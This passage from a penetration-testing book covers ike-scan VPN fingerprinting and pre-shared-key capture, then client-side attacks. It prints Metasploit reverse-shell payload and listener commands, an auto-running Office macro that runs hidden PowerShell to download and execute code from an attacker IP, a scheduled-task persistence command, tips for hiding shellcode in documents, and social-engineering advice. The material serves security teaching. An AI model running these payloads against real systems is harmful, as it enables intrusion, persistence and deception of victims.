Because IKE does not guarantee the reliability for transmitted packets, most VPN
gateway vendors use a proprietary protocol to deal with traffic that appears to be
lost. The ike-scan tool sends IKE probe packets to the VPN gateway, but it does
not reply to the response that it receives. The server responds as if the packets have
been lost and implements its backoff strategy to resend the packets. By analyzing
the time difference between the packets and the amount of retries, ike-scan can
fingerprint the vendor.
In the example shown in the following screenshot, the –M option causes each
payload to be shown on a separate line, making the output easier to read. The
-showbackoff option (as shown in the following screenshot) of ike-scan records
the response time of all the packets that were sent and received and then records
the delays for 60 seconds before displaying the results.
In the previous screenshot, the Vendor ID (VID) is an MD5 hash text string that
is specific to the vendor and is used to recognize a proprietary communication or
specific communications details.
The ike-scan tool can also be used to determine whether the gateway supports
the aggressive mode. If it does, it can be difficult to establish the handshake with
the server, because it will not respond until a valid ID is supplied as part of the
identification payload.
[ 281 ]
Exploiting Remote Access Communications
Capturing pre-shared keys
The ike-scan tool can be used to push a VPN gateway into the aggressive
mode. This is significant because the aggressive mode of IPSec does not protect
the pre-shared keys. The authentication credentials are sent as cleartext, which
can be captured and then cracked using offline tools.
The following example, issued against a Cisco VPN concentrator, uses the
following command:
root@kali@:~# ike-scan --pskcrack --aggressive
--id=peer 
The execution of the previous command is shown in the following screenshot:
If you wish to pipe the results to a text file for additional analysis and offline
password cracking, use the following command:
root@kali@:~# ike-scan --pskcrack --aggressive
--id=peer  > 
Performing offline PSK cracking
Before cracking the captured hash of the pre-shared key using an offline tool, edit
the output file to include only the hash value (it should contain nine colon-separated
values). The most effective tool to crack the key is psk-crack, which supports the
dictionary, brute force, and hybrid-mode cracking.
[ 282 ]
Chapter 10
Like all offline cracking exercises, success is a measure of the work and the effort
involved (the time, computational effort, and investment of energy on power systems).
A strong pre-shared key, such as the one shown in the previous screenshot, will take a
long time to crack.
Identifying default user accounts
Like most other hardware devices, VPN gateways usually contain default user
accounts at the time of the installation. These may not be changed by the administrator.
Using the information gathered during the fingerprinting process, a tester can conduct
a web search to identify the standard user accounts.
If the tester has access to a user's computer, the username credential is usually
stored as plaintext in the system registry. Furthermore, if a tester has access to
a system's memory, it is possible to obtain the password directly from the client
system's memory dump.
VulnVPN (www.rebootuser.com) is a virtual operating
system and vulnerable VPN server. It allows you to apply the
tools described in this chapter to compromise the application
and gain root access without damaging a production system.
Summary
In this chapter, we examined how to exploit common remote access applications,
including ones that have been encrypted to provide additional security. We
exploited operating system communications protocols (RDP and SSH) and
applications such as VNC. We also learned how to conduct reconnaissance of
secure socket layer connections and virtual private networks and attack types
that reduce the effectiveness of encryption.
In the next chapter, we will see the result of combined attacks against specific
communications channels with attacks against human beings. In examining the
effectiveness of these client-side exploits, we will review several types of attacks
as well as the Browser Exploitation Framework (BeEF) project.
[ 283 ]
Client-side Exploitation
The greatest challenge for an attacker or an effective penetration tester is to
bypass a target's security controls to achieve a compromise. This can be difficult
when targeting systems located on a network because the attacker usually needs
to bypass firewalls, proxies, intrusion detection systems, and other elements of
a defense-in-depth architecture.
A successful workaround strategy is to directly target the client-side applications.
The user initiates the interaction with the client application, allowing attackers to take
advantage of the existing trust that exists between the user and the application. The
use of social engineering methodologies will enhance the success of client-side attacks.
Client-side attacks target systems that typically lack the security controls (especially,
firewalls and intrusion detection systems) found on enterprise systems. If these attacks
are successful and persistent communication is established, the client device can be
used to launch attacks if it is reattached to the target's network.
By the end of this chapter, you will have learned how to attack client-side
applications using the following:
• Hostile script attacks (VBScript and PowerShell)
• The Cross-Site Scripting Framework
• The Browser Exploitation Framework
Client-side Exploitation
Attacking a system using hostile scripts
Client-side scripts, such as JavaScript, VBScript, and PowerShell, were developed to
move application logic and actions from the server to the client's computer. From an
attacker's or tester's perspective, there are several advantages of using these scripts,
as follows:
• They're already part of the target's natural operating environment; the
attacker does not have to transfer large compilers or other helper files
such as encryption applications to the target system.
• Scripting languages are designed to facilitate computer operations such as
configuration management and system administration. For example, they
can be used to discover and alter system configurations, access the registry,
execute programs, access network services and databases, and move binary
files via HTTP or e-mail. Such standard scripted operations can be readily
adopted for use by testers.
• Because they are native to the operating system environment, they do not
usually trigger antivirus alerts.
• They are easy to use since writing a script requires a simple text editor.
There are no barriers to using scripts in order to launch an attack.
Historically, JavaScript was the scripting language of choice to launch attacks due to its
widespread availability on most target systems. Because JavaScript attacks have been
well characterized, we'll focus on how Kali facilitates attacks using newer scripting
languages: VBScript and PowerShell.
Conducting attacks using VBScript
Visual Basic Scripting Edition (VBScript) is an Active Scripting language
developed by Microsoft. It was designed to be a lightweight, Windows-native
language that could execute small programs. VBScript has been installed by
default on every desktop release of Microsoft Windows since Windows 98,
making it an excellent target for client-side attacks.
To launch an attack using VBScript, we'll invoke Metasploit's msfpayload from
the command line:
root@kali:~# msfpayload windows/meterpreter/reverse_tcp
LHOST=[Your local Host] LPORT= [Your Local Port] V
[ 286 ]
Chapter 11
Note that V designates that the output will be a VBS macro script. The output will
appear as a text file with two specific parts, as shown in the following screenshot:
To use the script, open a Microsoft Office document and create a macro (the specific
command will depend on the version of Microsoft Windows in use). Copy the first
part of the text given in the following information box (from Sub Auto_Open() to
the final End Sub) into the macro editor and save it with macros enabled.
'**************************************************************
'*
'* MACRO CODE
'*
'**************************************************************
Sub Auto_Open()
Ffqsm12
End Sub
// Additional code removed for clarity
Sub Workbook_Open()
Auto_Open
End Sub
[ 287 ]
Client-side Exploitation
Next, copy the shellcode into the actual document. A partial excerpt of the shellcode
is shown in the following screenshot:
The shellcode is recognizable as a script that may be used to perform an attack,
so you may wish to hide or otherwise obfuscate the shellcode by minimizing the
font size and making the color match the document's background.
The attacker must set up a listener on Metasploit. After entering msfconsole at a
command prompt, the attacker will typically enter the following commands and
set the options for host, port, and payload; in addition, the attacker will configure
the connection to automatically migrate to the more stable explorer.exe process,
as shown in the following command lines.
msf>use exploit/multi/handler
msf>set lhost 192.168.43.130
msf>set lport 4444
msf>set payload windows/meterpreter/reverse_tcp
msf>set autorunscript migrate -n explorer.exe
msf >exploit
When the file is sent to the target, it will launch a pop-up security warning when it is
opened; therefore, attackers will use social engineering to force the intended victim to
select the Enable option. One of the most common methods to do this is to embed the
macro in a Microsoft Word document or Excel spreadsheet that has been configured
to play a game.
Launching the document will create a reverse TCP shell back to the attacker,
allowing the attacker to ensure a persistent connection with the target and conduct
post-exploit activities.
To extend this attack methodology, we can convert any executable to VBScript using
exe2vba.rb located at /usr/share/metasploit-framework/tools.
[ 288 ]
Chapter 11
For example, first create a backdoor using the Metasploit framework. Note that
X designates that the backdoor will be created as an executable (attack.exe), as
shown in the following screenshot:
Next, execute exe2.vba to convert the executable to VBScript using the following
command (ensure that correct pathnames are used):
# ruby exe2vba.rb attack.exe attack.vbs
[*] Converted 73802 bytes of EXE into a VBA script
This will allow the executable to be placed in a Microsoft macro-enabled document
and sent to a client. VBScript can be used to execute the reverse shell and to alter the
system registry in order to ensure that the shell remains persistent. We have found
attacks of this type to be one of the most effective ways to bypass network security
controls and maintain a connection to a secured network.
From an attacker's perspective, there are some significant advantages of using
exploits based on VBScript (this continues to be a powerful tool). However, its use
is rapidly being replaced by a more powerful scripting language: PowerShell.
Attacking systems using Windows
PowerShell
Windows PowerShell is a command-line shell and scripting language intended
to be used for system administration. Based on the .NET framework, it extends the
capabilities that were available in VBScript. The language itself is quite extensible.
Since it is built on .NET libraries, you can incorporate code from languages such as
C# or VB.NET. You can also take advantage of third-party libraries. In spite of this
extensibility, it is a concise language. VBScripts that require more than 100 lines of
code can be reduced to as little as 10 lines of PowerShell!
Perhaps, the best feature of PowerShell is that it is available by default on most
modern Windows-based operating systems (Windows 7 and higher versions)
and cannot be removed.
[ 289 ]
Client-side Exploitation
We will use PowerShell scripts included with the Metasploit Framework to support
the attack phase of the kill chain.
To launch the attack, we will use the PowerShell Payload Web Delivery module
of the Metasploit Framework. The purpose of this module is to rapidly establish
a session on the target system. The attack does not write to the disk, so it is less
likely to trigger detection by the client-side antivirus. Launching of the attack
and the available module options are shown in the following screenshot:
The Metasploit Framework will generate a one-line macro that can be embedded in
a document and used to launch the attack, as shown in the following sample code:
Sub AutoOpen()
Call Shell("PowerShell.exe -w hidden -nop -ep bypass -c ""IEX
((new-object
net.webclient).downloadstring('http://192.168.1.102:4444/boom'
))"",1)
End Sub
Before the attack is completed, the attacker must prepare a listener for the incoming
shell (URIPATH was generated randomly by Metasploit; make sure that the correct
URIPATH is set for the listener). The commands to create a listener are as follows:
msf> use exploit/windows/misc/psh_web_delivery
msf exploit(psh_web_delivery) > set SRVHOST 192.168.1.102
msf exploit(psh_web_delivery) > set URIPATH boom
msf exploit(psh_web_delivery) > exploit
[ 290 ]
Chapter 11
A successful attack will create an interactive shell on the attacker's system.
It is possible to make psh_web_delivery persistent using the
schtask command. The following command will create a scheduled
task, MSOfficeMngmt, which will implement powershell.exe
(by default, located in the Windows\system32 directory) at logon:
schtasks /create /tn MSOfficeMngmt /tr "powershell.exe
-WindowsStyle hidden -NoLogo -NonInteractive
-ep -bypass -nop -c 'IEX ((new-object
net.webclient).downloadstring
(''http://192.168.1.104:4444/boom'''))'" /sc onlogon
/ru System
Additional PowerShell scripts designed to support post-exploit activities can be
found in Kali's PowerSploit directory. In spite of the flexibility of PowerShell, it has
some disadvantages.
For example, if the document containing the macro is closed by the end user before
a persistence mechanism can be applied, the connection is lost.
More importantly, scripts such as VBScript and PowerShell are only useful against
Microsoft environments. To extend the reach of client-side attacks, we need to
look for a common client-side vulnerability that can be exploited regardless of its
operating system environment. One particular example of such a vulnerability is
cross-site scripting.
The Cross-Site Scripting Framework
Cross-Site Scripting (XSS) vulnerabilities are reportedly the most common
exploitable vulnerabilities found in websites. It is estimated that they are
present in up to 80 percent of all applications.
XSS vulnerabilities occur when an application, usually web-based, violates the
concept of trust known as the same-origin policy and displays content that has been
provided by a user that has not been sanitized to remove malicious statements.
There are at least two primary types of XSS vulnerabilities: non-persistent
and persistent.
The most common type is non-persistent or reflected vulnerabilities. These occur when
the data provided by the client is used immediately by the server to display a response.
An attack of this vulnerability can occur via e-mail or a third-party website providing
a URL that appears to reference a trusted website but contains the XSS attack code. If
the trusted site is vulnerable to this particular attack, executing the link can cause the
victim's browser to execute a hostile script that may lead to a compromise.
[ 291 ]
Client-side Exploitation
Persistent (stored) XSS vulnerabilities occur when the data provided by the attacker
is saved by the server and then is permanently displayed on trusted web pages to
other users during the course of their browsing. This commonly occurs with online
message boards and blogs that allow users to post HTML-formatted messages. An
attacker can place a hostile script on the web page that is not visible to incoming
users, but which compromises visitors who access the affected pages.
Several tools exist on Kali Linux to find XSS vulnerabilities, including xsser and
various vulnerability scanners. However, there are some tools that allow a tester
to fully exploit an XSS vulnerability, demonstrating the gravity of the weakness.
The Cross-Site Scripting Framework (XSSF) is a multiplatform security tool that
exploits XSS vulnerabilities to create a communication channel with the target,
supporting attack modules that include:
• Conducting reconnaissance of a target browser (fingerprinting and previously
visited URLs), the target host (detecting virtual machines, getting system info,
registry keys, and wireless keys), and the internal network.
• Sending an alert message pop up to the target. This simple "attack" can be
used to demonstrate the XSS vulnerability, however, more complex alerts
can mimic logon prompts and capture user authentication credentials.
• Stealing cookies that enable an attacker to impersonate the target.
• Redirecting the target to view a different web page. A hostile web page may
automatically download an exploit onto the target system.
• Loading PDF files or Java applets onto the target, or stealing data such as
SD card contents from Android mobile devices.
• Launching Metasploit attacks, including browser_autopwn, as well as
denial-of-service attacks.
• Launching social engineering attacks, including autocomplete theft,
clickjacking, Clippy, fake flash updates, phishing, and tabnabbing.
In addition, the XSSF Tunnel function allows an attacker to impersonate the victim
and browse websites using their credentials and session. This can be an effective
method to access an internal corporate intranet.
The API is well documented, allowing new attack modules to be easily created.
Because it is written in Ruby, the API integrates with the Metasploit Framework,
allowing attackers to launch additional attacks.
[ 292 ]
Chapter 11
To use XSSF, it must be installed and configured to support an attack using the
following steps:
1. XSSF does not come with Kali. First, the user must open a terminal window
and set the appropriate directory using the following command:
root@kali:~# cd /opt/metasploit/apps/pro/msf3
2. Install XSSF using the following command:
svn export http://xssf.googlecode.com/svn/trunk ./ --force
Make sure that you use svn export instead of svn checkout, as the latter
command will break the existing MSF svn files. An excerpt of a successful
installation is shown in the following screenshot:
3. From the Metasploit Framework console, load the XSSF plugin using the
load xssf command, as shown in the following screenshot:
[ 293 ]
Client-side Exploitation
4. Identify the XSSF commands, as shown in the following screenshot, by
typing helpxssf:
5. From the console, access the URLs associated with the plugin using the
following command:
msf>xssf_urls
The execution of the previous command is given in the following screenshot,
as you can see, several URLs are identified:
The most important URL is the XSSF server, which is located on the localhost.
Several other URLs are identified, including the following: